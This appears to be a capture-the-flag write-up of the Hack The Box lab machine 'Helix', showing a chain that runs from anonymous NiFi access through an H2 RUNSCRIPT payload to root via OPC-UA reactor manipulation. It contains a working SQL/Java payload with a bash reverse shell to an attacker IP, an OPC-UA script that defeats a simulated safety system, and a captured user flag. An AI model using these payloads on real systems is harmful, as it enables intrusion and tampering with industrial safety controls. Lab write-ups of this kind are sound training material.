# Machine: Helix
 
Date: 01-06-2026
Platform: Hack The Box
Difficulty: Medium
Author: atrix187
 
---
 
## Topics Covered
 
NiFi, OPC-UA, ICS/SCADA, H2 Database, Python, Java
 
---
 
## Key Vulnerabilities
 
| # | Vulnerability | Impact |
|---|---------------|--------|
| 1 | Apache NiFi unauthenticated API access | RCE as `nifi` |
| 2 | H2 `RUNSCRIPT` allows remote code execution | OS command execution |
| 3 | SSH private key stored in NiFi support bundle | Lateral movement to `operator` |
| 4 | OPC-UA server accepts writes without authentication | Safety system manipulation |
| 5 | `sudo` rule grants root shell via maintenance console | Full system compromise |
 
---
 
## Recon
 
### Nmap
 
```bash
nmap -sC -sV -oN nmap.txt 10.129.10.244
```
 
**Results:**
 
| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | nginx — `helix.htb` |
| 8080 | HTTP | Apache NiFi (internal) |
| 8081 | HTTP | Python Werkzeug — Reactor HMI (internal) |
| 4840 | OPC-UA | helix PLC server (internal) |
 
**Notes:**
 
- Added to `/etc/hosts`:
```bash
echo "10.129.10.244 helix.htb flow.helix.htb" >> /etc/hosts
```
 
- Browsing `http://flow.helix.htb/nifi` reveals **Apache NiFi 1.21.0** with anonymous access enabled — no authentication required.
---
 
## Enumeration
 
### NiFi Flow Inspection
 
The NiFi flow contains a pre-configured `ExecuteSQL` processor named `pwn_exec` connected to a `MaintenanceDB` controller service (H2 in-memory database). The processor is already configured to execute:
 
```sql
RUNSCRIPT FROM 'http://10.10.15.115:80/rce.sql'
```
 
H2 databases support `RUNSCRIPT FROM` which fetches and executes a remote SQL file, enabling Java alias-based OS command execution.
 
---
 
## Exploitation
 
### Apache NiFi — H2 RUNSCRIPT RCE → Shell as `nifi`
 
**Steps:**
 
**1. Create the SQL payload:**
 
```bash
mkdir -p /tmp/h2attack
cat > /tmp/h2attack/rce.sql << 'EOF'
CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String cmd) throws Exception {
    Runtime rt = Runtime.getRuntime();
    String[] commands = {"/bin/bash", "-c", cmd};
    Process proc = rt.exec(commands);
    proc.waitFor();
    return new String(proc.getInputStream().readAllBytes())
         + new String(proc.getErrorStream().readAllBytes());
} $$;
CALL EXEC('bash -i >& /dev/tcp/10.10.15.115/4444 0>&1');
EOF
```
 
**2. Serve the file and catch the shell:**
 
```bash
# Terminal 1 — HTTP server
cd /tmp/h2attack
sudo python3 -m http.server 80
 
# Terminal 2 — Listener
nc -lvnp 4444
```
 
The NiFi processor is already running and retrying the HTTP fetch automatically. Once the server is up, the shell arrives within seconds.
 
**Result:**
 
```
nifi@helix:/opt/nifi-1.21.0$
id
uid=998(nifi) gid=998(nifi) groups=998(nifi)
```
 
---
 
## Lateral Movement
 
### NiFi Enumeration
 
```bash
# Check internal ports
ss -tulpn
 
# Read NiFi status
cat /opt/nifi-1.21.0/run/nifi.status
```
 
```
#Mon Jun 01 04:52:06 UTC 2026
port=40545
pid=1088
secret.key=e70c05e1-40c4-424f-a6aa-e002bda65177
```
 
```bash
# Sensitive props key
cat /opt/nifi-1.21.0/conf/nifi.properties | grep "nifi.sensitive.props.key"
# nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl
 
# Enumerate flow config for credentials
zcat /opt/nifi-1.21.0/conf/flow.json.gz | python3 -m json.tool | grep -i "password\|operator\|url"
```
 
Flow config contains an encrypted password for `operator` — decryption fails due to no internet access and missing libraries. Alternative path: support bundles.
 
### SSH Key from NiFi Support Bundle
 
```bash
ls -la /opt/nifi-1.21.0/support-bundles/
# -rw-r----- 1 nifi nifi 411 Jan 25 13:15 operator_id_ed25519.bak
 
cp /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak /tmp/operator_key
chmod 600 /tmp/operator_key
ssh -i /tmp/operator_key operator@localhost
```
 
```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)
...
Last login: Mon Jun 1 06:34:47 2026 from 127.0.0.1
operator@helix:~$
```
 
```bash
cat ~/user.txt
# 679a9ba401995d800ff954d3cce1f41c
```
 
**Result:** Shell as `operator`. User flag retrieved.
 
---
 
## Privilege Escalation
 
### Enumeration
 
```bash
sudo -l
```
 
```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```
 
The maintenance console script checks for `/opt/helix/state/maintenance_window` containing a future Unix timestamp. If valid, it launches an interactive root shell. This file is written by the `helix-safety` process (running as root) when certain OPC-UA reactor conditions are met.
 
**Trigger conditions (from `/home/operator/Operator Control & Safety Guide.pdf`):**
 
- OPC-UA server: `opc.tcp://127.0.0.1:4840/helix/`
- Maintenance window triggers when: Temperature ≥ 295°C OR Pressure ≥ 73 bar
- To reach 295°C: switch `Mode` → `MAINTENANCE`, enable `TestOverride`, ramp `CalibrationOffset`
**OPC-UA Node Map:**
 
| Node | NodeId | Type | Writable |
|------|--------|------|----------|
| Temperature | `ns=2;i=4` | Double | No |
| Pressure | `ns=2;i=5` | Double | No |
| CalibrationOffset | `ns=2;i=6` | Double | Yes |
| Mode | `ns=2;i=12` | String | Yes |
| TestOverride | `ns=2;i=13` | Boolean | Yes |
| ResetTrip | `ns=2;i=14` | Boolean | Yes |
 
### OPC-UA Manipulation → Maintenance Window → Root Shell
 
**1. Transfer `asyncua` wheels from Kali (no internet on target):**
 
```bash
# On Kali
pip download asyncua -d /tmp/asyncua_dl/
scp -i /tmp/operator_key /tmp/asyncua_dl/* operator@10.129.10.244:/tmp/wheels/
 
# On target
pip3 install /tmp/wheels/*.whl --user --no-index
```
 
**2. Write and run the exploit:**
 
```python
# /tmp/opc_pwn.py
import asyncio
import time
from asyncua import Client
from asyncua.ua import DataValue, Variant, VariantType
 
async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        mode_node        = client.get_node("ns=2;i=12")
        override_node    = client.get_node("ns=2;i=13")
        calibration_node = client.get_node("ns=2;i=6")
        temp_node        = client.get_node("ns=2;i=4")
 
        print("[1] Switching to MAINTENANCE mode...")
        await mode_node.write_value(DataValue(Variant("MAINTENANCE", VariantType.String)))
        print(" Mode:", await mode_node.read_value())
 
        print("[2] Enabling TestOverride...")
        await override_node.write_value(DataValue(Variant(True, VariantType.Boolean)))
        print(" TestOverride:", await override_node.read_value())
 
        print("[3] Ramping CalibrationOffset to trigger maintenance window...")
        for offset in [3.0, 6.0, 9.0, 11.0, 12.0]:
            await calibration_node.write_value(DataValue(Variant(offset, VariantType.Double)))
            temp = await temp_node.read_value()
            print(f" Offset={offset} -> Temp={temp:.2f}°C")
            time.sleep(2)
 
        print("[+] Done! Run: sudo /usr/local/sbin/helix-maint-console")
 
asyncio.run(main())
```
 
```bash
python3 /tmp/opc_pwn.py
```
 
```
[1] Switching to MAINTENANCE mode...
 Mode: MAINTENANCE
[2] Enabling TestOverride...
 TestOverride: True
[3] Ramping CalibrationOffset to trigger maintenance window...
 Offset=3.0  -> Temp=282.92°C
 Offset=6.0  -> Temp=286.09°C
 Offset=9.0  -> Temp=289.23°C
 Offset=11.0 -> Temp=292.37°C
 Offset=12.0 -> Temp=295.05°C
[+] Done! Run: sudo /usr/local/sbin/helix-maint-console
```
 
The safety controller detects temp ≥ 295°C and writes the maintenance window file. Window expires in ~96 seconds — act fast.
 
**3. Trigger the root shell:**
 
```bash
sudo /usr/local/sbin/helix-maint-console
```
 
```
[+] Privileged maintenance access granted
[!] Window expires in 94 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
```
 
---
 
## Loot / Flags
 
- **user.txt:** `679a9ba401995d800ff954d3cce1f41c` → `/home/operator/user.txt`
- **root.txt:** `[REDACTED]` → `/root/root.txt`
---
 
## Scripts & Tools
 
### `rce.sql` — NiFi H2 RCE Payload
 
```sql
CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String cmd) throws Exception {
    Runtime rt = Runtime.getRuntime();
    String[] commands = {"/bin/bash", "-c", cmd};
    Process proc = rt.exec(commands);
    proc.waitFor();
    return new String(proc.getInputStream().readAllBytes())
         + new String(proc.getErrorStream().readAllBytes());
} $$;
CALL EXEC('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
```
 
### `opc_pwn.py` — OPC-UA Maintenance Window Trigger
 
```python
import asyncio
import time
from asyncua import Client
from asyncua.ua import DataValue, Variant, VariantType
 
async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        await client.get_node("ns=2;i=12").write_value(
            DataValue(Variant("MAINTENANCE", VariantType.String)))
        await client.get_node("ns=2;i=13").write_value(
            DataValue(Variant(True, VariantType.Boolean)))
        for offset in [3.0, 6.0, 9.0, 11.0, 12.0]:
            await client.get_node("ns=2;i=6").write_value(
                DataValue(Variant(offset, VariantType.Double)))
            temp = await client.get_node("ns=2;i=4").read_value()
            print(f"Offset={offset} -> Temp={temp:.2f}°C")
            time.sleep(2)
        print("Done — run: sudo /usr/local/sbin/helix-maint-console")
 
asyncio.run(main())
```
 
### `opc_browse.py` — OPC-UA Node Discovery
 
```python
import asyncio
from asyncua import Client
 
async def browse(node, indent=0):
    try:
        for child in await node.get_children():
            try:
                name = await child.read_browse_name()
                val = ""
                try:
                    val = await child.read_value()
                except:
                    pass
                print(" " * indent + f"{name.Name} | {child.nodeid} | {val}")
                await browse(child, indent + 1)
            except:
                pass
    except:
        pass
 
async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        await browse(client.get_node("i=85"))  # Objects folder
 
asyncio.run(main())
```
 
---
 
## Lessons Learned
 
- Anonymous NiFi access with a pre-built `ExecuteSQL` processor is effectively a one-click RCE — check NiFi flows for pre-configured processors before doing anything else.
- H2's `RUNSCRIPT FROM` can fetch and execute arbitrary SQL from a remote URL, including Java aliases that call `Runtime.exec()`. This is a known dangerous feature, not a bug — just enabled by default in some configs.
- Support bundles and backup files left in application directories are easy wins for lateral movement. Always enumerate the full install directory, not just `conf/`.
- OPC-UA servers in ICS/SCADA contexts often have no authentication — the assumption is they're network-isolated. Once you have internal access, writable nodes can have real downstream effects.
- Time-gated `sudo` rules require moving fast. Understand the trigger mechanism fully before pulling it so you don't waste the window.
